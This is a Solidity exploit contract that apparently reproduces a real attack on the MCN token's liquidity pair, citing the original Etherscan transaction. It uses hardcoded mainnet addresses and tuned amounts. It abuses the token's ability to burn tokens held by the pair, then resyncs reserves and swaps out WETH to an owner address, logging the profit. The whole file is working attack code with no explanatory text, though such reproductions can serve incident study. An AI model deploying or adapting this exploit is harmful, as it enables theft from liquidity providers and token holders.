pragma solidity ^0.6.0;
// https://etherscan.io/tx/0xd091afe6b37256ebb3dd703a9646b27aaf7ce7fe8832778886ba0216361f7f00
import "./Mcn.sol";
import "./MEpair.sol";
import "./Weth.sol";
import "hardhat/console.sol";

contract test{
    Mcn mcn = Mcn(0xc047C42554c6495c85108aE8ee66fA4E3B88176d);
    MEpair pair = MEpair(0x6c239518495F92363Ad341B2290984EDA7623d1e);
    Weth weth = Weth(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2);
    address owner = 0x0B61982356cF13D4CAAACa906f0fD8CB1e3d1e76;

    uint eamount = 0.01 ether;
    uint mamount = 7022000000000000000000;
    uint burn =  27126220522013288881625851;
    uint ethamount = 38465407605677952801;

    function start() public {
        weth.deposit{value:2000000000000000000}();
        weth.transfer(address(pair),eamount);
        pair.swap(0,mamount,address(this),"");
        mcn.burn(address(pair),burn);
        pair.sync();
        mcn.transfer(address(pair),mamount);
        pair.swap(ethamount,0,owner,"");
        uint balance = weth.balanceOf(address(owner));
        console.log("profit:  ",balance / 1 ether);

    }
    fallback() external payable {
        
    }
}